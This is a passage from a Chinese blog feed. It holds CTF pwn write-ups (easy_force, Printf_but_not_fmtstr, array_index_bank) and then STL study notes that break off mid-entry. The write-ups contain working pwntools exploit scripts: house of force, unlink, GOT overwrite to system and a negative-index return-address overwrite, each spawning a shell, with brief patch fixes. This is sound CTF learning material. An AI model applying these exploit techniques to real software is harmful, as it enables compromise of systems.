string">"0x7f"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> EOFErroradd<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x219098</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libc.got['strlen']</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span>b<span class="token string">'k'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0xebcf1</span><span class="token comment" spellcheck="true"># edit(3,p64(system_addr))</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># shell()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序只有一个功能,可以看出malloc的size不限,最多可以制造0x20的堆溢出.且可以得到堆块的地址(mmap的堆块就是libc地址).符合house of force的条件.改下got表就好了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302115399.png"></p><p>覆盖got表的时候可以用one_gadget,看了别的师傅的巧妙布置,覆盖malloc_got为system,然后在size输入binsh字符串的地址.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302114666.png"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python">ask<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x30000</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'on '</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>leak_libc<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>libc_addr<span class="token number">-0x54b970</span><span class="token punctuation">)</span>ask<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'on '</span><span class="token punctuation">)</span>top <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">)</span>ask<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>force<span class="token punctuation">(</span>top<span class="token punctuation">,</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'malloc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>ask<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'4.go away\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'want'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>改0x30为v2就好,记得补nop.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302130948.png"></p><h2 id="Printf-but-not-fmtstr"><a href="#Printf-but-not-fmtstr" class="headerlink" title="Printf_but_not_fmtstr"></a>Printf_but_not_fmtstr</h2><p>题目名称意义不明.glibc2.36堆题但是partial relro,能改got就改got了.有uaf,堆块限制在0x500-0x900.</p><p>先unsortedbin泄露地址,然后打unlink.</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x520</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x518</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>leak_libc<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>p<span class="token punctuation">.</span>recvaddress<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1f6cc0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x530</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x521</span><span class="token punctuation">,</span><span class="token number">0x4040E8</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x4040E8</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="array-index-bank"><a href="#array-index-bank" class="headerlink" title="array_index_bank"></a>array_index_bank</h2><p>负数索引,泄露pie和栈地址,然后绕过一些检查先改you再改返回地址就行了.</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python">io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">'-3'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'] = '</span><span class="token punctuation">)</span>pie_base <span class="token operator">=</span> p<span class="token punctuation">.</span>recvaddress<span class="token punctuation">(</span><span class="token string">"int"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x14ff</span>lg<span class="token punctuation">(</span><span class="token string">"pie_base"</span><span class="token punctuation">,</span>pie_base<span class="token punctuation">)</span>you <span class="token operator">=</span> pie_base<span class="token operator">+</span><span class="token number">0x4010</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">'-2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'] = '</span><span class="token punctuation">)</span>ret_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvaddress<span class="token punctuation">(</span><span class="token string">"int"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span>stack <span class="token operator">=</span> ret_addr<span class="token number">-0x38</span>lg<span class="token punctuation">(</span><span class="token string">"ret"</span><span class="token punctuation">,</span>ret_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>you<span class="token operator">-</span>stack<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>ret_addr<span class="token operator">-</span>stack<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>pie_base<span class="token operator">+</span><span class="token number">0x1318</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>改为无符号比较:jle-&gt;jbe</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>STL学习笔记</title>
      <link href="/2023/09/12/STL--Notes/"/>
      <url>/2023/09/12/STL--Notes/</url>
      
        <content type="html"><![CDATA[<p>所有内容均基于SGI STL.该项目仅作为本人学习C++STL库,数据结构与算法使用.</p><span id="more"></span><h2 id="内存置配器"><a href="#内存置配器" class="headerlink" title="内存置配器"></a>内存置配器</h2><p>容器使用内存置配器来进行内存空间的分配和释放.<br>为了适配STL标准,在实际使用的分配器实现一个上层接口类simple_alloc.该类默认使用第二级分配器</p><h3 id="第一级分配器-malloc-alloc-template"><a href="#第一级分配器-malloc-alloc-template" class="headerlink" title="第一级分配器 malloc_alloc_template"></a>第一级分配器 malloc_alloc_template</h3><p>该分配器在内部直接使用operator new/delete进行内存管理</p><h3 id="第二级分配器-default-alloc-template"><a href="#第二级分配器-default-alloc-template" class="headerlink" title="第二级分配器 default_alloc_template"></a>第二级分配器 default_alloc_template</h3><p>该分配器以小型内存池进行内存管理,减轻分配内存时的cookie占用的内存.</p><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护一个free_list数组,每一个free_list是一个存放未分配内存的单向链表(的头指针).用来管理释放或未分配的内存.<br>另外维护两个所有二级分配器共用的静态指针start_free和end_free,分别指向空闲内存(空闲且未链入free_list)的首尾.<br>还有一个size_t类型的heap_size成员,在重新向操作系统malloc内存时会用到其来计算需要申请的空间大小,但不太懂其存在的意义.</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h5><p>当容器使用alloc分配空间时,若内存超过128bytes(MAX_BYTES)使用第一级分配器进行内存分配.反之使用第二级.</p><p>首先检查对应大小的free_list是否存在未分配空间.若有就直接取出.<br>如果没有,调用refill函数用空闲内存区域先填充free_list(内存充足的情况下每次链入20块),再取出一块完成分配.<br>refill函数其实只负责将从空闲内存区域取出的空间链入free_list,实际的取出工作由chunk_alloc函数完成.</p><p>chunk_alloc函数先检查空闲区域是否足够取出20个对应大小的堆块,若够则能取多少个取多少.如果一个的空间都不够,就先将空闲区域整个链入free_list对应大小链表中.然后调用malloc函数向系统申请2*20*nbytes(一个元素的大小)字节的空间.</p><h5 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h5><p>若内存超过128bytes,使用第一级分配器释放内存.<br>否则使用第二级分配器直接链入对应free_list中.</p><p>值得注意的时,第二级分配器并没有对free_list以及start_free~end_free之间区域的释放操作,这一操作最后将由操作系统完成?<br><a href="https://www.zhihu.com/question/38524347">STL allocator何时释放内存？</a></p><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>迭代器用来粘合算法和容器.</p><h4 id="Traits技法"><a href="#Traits技法" class="headerlink" title="Traits技法"></a>Traits技法</h4><h5 id="template参数推导机制"><a href="#template参数推导机制" class="headerlink" title="template参数推导机制"></a>template参数推导机制</h5><p>在算法中使用迭代器时,可能会使用到迭代器所指之物的型别,该型别可以利用template参数推导机制完成.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">I</span><span class="token operator">></span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span>I iter<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">func2</span><span class="token punctuation">(</span>iter<span class="token punctuation">,</span><span class="token operator">*</span>iter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//func2可通过参数推导机制获得iter所指型别</span><span class="token punctuation">}</span></code></pre><p>但如果func函数需要返回一个iter指向的对象,template推导机制就不起作用了</p><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">//下列写法无法通过编译</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">I</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">*</span>I<span class="token punctuation">)</span> <span class="token function">func</span><span class="token punctuation">(</span>I iter<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">func2</span><span class="token punctuation">(</span>iter<span class="token punctuation">,</span><span class="token operator">*</span>iter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h5 id="内嵌型别声明"><a href="#内嵌型别声明" class="headerlink" title="内嵌型别声明"></a>内嵌型别声明</h5><p>我们可以使用内嵌型别声明的方法解决该问题.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">struct</span> Iterator<span class="token punctuation">{</span><span class="token keyword">typedef</span> T value_type<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">I</span><span class="token operator">></span><span class="token keyword">typename</span> I<span class="token operator">::</span>value_type <span class="token function">func</span><span class="token punctuation">(</span>I iter<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">func2</span><span class="token punctuation">(</span>iter<span class="token punctuation">,</span><span class="token operator">*</span>iter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对于泛型算法,不仅需要接受迭代器,还需要能够接受一个原生指针作为参数,而原生指针没有,我们也无法为其内嵌一个名为value_type的变量<br>于是需要用到traits技法</p><h5 id="Traits"><a href="#Traits" class="headerlink" title="Traits"></a>Traits</h5><p>使用中间层traits,利用template参数推导机制进行偏特化,将原生指针和迭代器统一.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304061931218.webp"></p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">struct</span> iterator_traits <span class="token punctuation">{</span>    <span class="token keyword">typedef</span> <span class="token keyword">typename</span> T<span class="token operator">::</span>value_type value_type<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 偏特化1</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">struct</span> iterator_traits<span class="token operator">&lt;</span>T<span class="token operator">*</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">typedef</span> T value_type<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 偏特化2</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">struct</span> iterator_traits<span class="token operator">&lt;</span><span class="token keyword">const</span> T<span class="token operator">*</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">typedef</span> T value_type<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>根据迭代器操作容器元素的方式,分为InputIterator和OutputIterator<br>根据迭代器遍历容器的方式,分为ForwardIterator,BidirectionalIterator,RandomAccessIterator等.</p><p>为了使函数能够获取迭代器的类型,将类型标签定义为一个新类型,再以traits方式型别声明为category,使用时进行萃取.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">struct</span> input_iterator_tag<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> output_iterator_tag<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> forward_iterator_tag<span class="token operator">:</span><span class="token keyword">public</span> input_iterator_tag<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> bidirectional_iterator_tag<span class="token operator">:</span><span class="token keyword">public</span> forward_iterator_tag<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> random_access_iterator_tag<span class="token operator">:</span><span class="token keyword">public</span> bidirectional_iterator_tag<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><p>单端开口的连续线性空间容器</p><h4 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h4><p>由于该容器的空间是连续线性的,故其迭代器为原生指针.迭代器在扩容后失效</p><h4 id="成员变量-1"><a href="#成员变量-1" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护了三个指针(即vector的迭代器类型),start指向vector已存储区域的开头,finish指向vector中已存储区域的末尾,end_of_storage指向vector总存储空间的末尾.</p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>加入新元素时,若存储空间充足就直接在finish构造元素,若存储空间不足便申请二倍存储空间,将原空间内容拷贝到新申请的空间,再释放掉原有空间.<br>由于扩容操作会使vector中所有元素迁移,故迭代器失效.</p><h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>由于迭代器失效,若程序有对迭代器的保存动作,可能造成uaf,double free等安全问题.</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>两端开口的双向环状链表</p><h4 id="迭代器-2"><a href="#迭代器-2" class="headerlink" title="迭代器"></a>迭代器</h4><p>Bidirectional迭代器.内嵌一个链表结点指针.以链表结点的指针完成迭代.迭代器不会失效</p><h4 id="成员变量-2"><a href="#成员变量-2" class="headerlink" title="成员变量"></a>成员变量</h4><p>仅维护一个环状链表中的空结点指针</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><p>和普通双向环状链表区别不大.<br>注意一下5个基本操作,有助于对list空间结构的想象.</p><pre class=" language-c"><code class="language-c">    iterator <span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>link_type<span class="token punctuation">)</span><span class="token punctuation">(</span>node<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    iterator <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>link_type<span class="token punctuation">)</span>node<span class="token punctuation">;</span> <span class="token punctuation">}</span>    bool <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> node<span class="token operator">-></span>next <span class="token operator">==</span> node<span class="token punctuation">;</span> <span class="token punctuation">}</span>    reference <span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">*</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    reference <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><p>两端开口的连续线性空间.(连续线性空间实则是伪造的)</p><h4 id="迭代器-3"><a href="#迭代器-3" class="headerlink" title="迭代器"></a>迭代器</h4><p>内含四个指针,分别为value_type*类型的cur,first,last分别指向所在缓冲区的当前元素,头部,尾部.另一个map_pointer指向deque的管控中心map(不是STL中的容器map)</p><p>deque的连续线性空间伪造主要依靠的便是迭代器,迭代器在到达一片缓冲区的末尾时跳跃到下一缓冲区或到达开头时跳转到上一个缓冲区,伪造出连续的空间.</p><h4 id="成员变量-3"><a href="#成员变量-3" class="headerlink" title="成员变量"></a>成员变量</h4><p>指向map的指针和map_size.迭代器start,finish分别关联第一个和最后一个缓冲区</p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><p>主要是map的扩容.</p><h3 id="RB-tree"><a href="#RB-tree" class="headerlink" title="RB-tree"></a>RB-tree</h3><p>具有排序的平衡二叉树,用于快速查找.</p><h4 id="迭代器-4"><a href="#迭代器-4" class="headerlink" title="迭代器"></a>迭代器</h4><p>内含一个指向树结点的指针,increment和decrement操作使迭代器指向比当前结点值大的最小元素.(对迭代器而言并没有”大小”的概念,例如increment只是简单的移动到右节点,然后持续移动到左叶子结点.”大小的概念由容器插入节点的树成长过程体现”)</p><h4 id="成员变量-4"><a href="#成员变量-4" class="headerlink" title="成员变量"></a>成员变量</h4><p>一个header指针,一个node_count,一个用于元素比较的仿函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141728705.png"></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>主要学习函数dispatch<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304091803715.png"></p><h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><p>push_heap:新加入的元素放在最后一个结点,循环与父节点比较判断是否交换.<br>pop_heap:将根节点的值与最后一个结点的值交换(交换只是一种说法,实际实现可以不同),让最后一个结点进行下溯交换,直到回到根节点当前位置的前一个.<br>sort_heap:反复进行pop_heap,每次将finish-1即可排序.<br>make_heap:使用pop_heap类似的下溯操作,从最后一个父节点开始依次进行下溯后再使用push_heap操作完成实质的父子结点比较排序过程.</p><p>要注意一点,下溯操作仅是下放某个结点,并不涉及排序.所以《STL源码剖析》一书中侯捷的注释是错误的.按书上更改后,pop_heap调用时若左叶子结点的值小于右叶子节点的值发生错误,make_heap调用时也是错误.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309111124768.png"></p><h2 id="配接器"><a href="#配接器" class="headerlink" title="配接器"></a>配接器</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>单端开口先进先出.<br>Stack内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>单端开口先进后出<br>Queue内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><p>单端开口,出队顺序由排序方式决定.<br>以vector为底层容器进行封装,算法主要由heap算法实现.</p><h3 id="set-map"><a href="#set-map" class="headerlink" title="set map"></a>set map</h3><p>默认均以rb_tree为底层容器,区别是前者键值相同,后者键值类型不一定相同.</p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><h2 id="思考题1"><a href="#思考题1" class="headerlink" title="思考题1"></a>思考题1</h2><blockquote><p>在写容器的时候 容器里有很多的成员函数或者非成员函数 。有的容器都有对元素的增删操作 ，那么这些操作在如何不恰当使用的情况下，会造成安全问题请构造出poc来 。</p></blockquote><h3 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h3><p>这个其实不能算是容器的增删操作导致的,而是所有类中指针的通病.<br>在没有重载复制(构造)函数情况下,默认的复制(构造)函数会直接复制指针的值(浅拷贝),当其中一个对象销毁时释放掉指针内存而另一个对象还保留着已释放内存的指针.<br>如图,vec和vec2使用同一块内存,若vec被销毁,vec2中仍存有该内存指针造成uaf.<br>(由于STL二级空间置配器并未真正释放内存给操作系统,所以asan并未检测到double free)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162312107.png"><br>改用一级空间置配器检测到double free.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162322079.png"></p><p>重载拷贝构造函数后正常:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141856874.png"></p><h2 id="思考题2"><a href="#思考题2" class="headerlink" 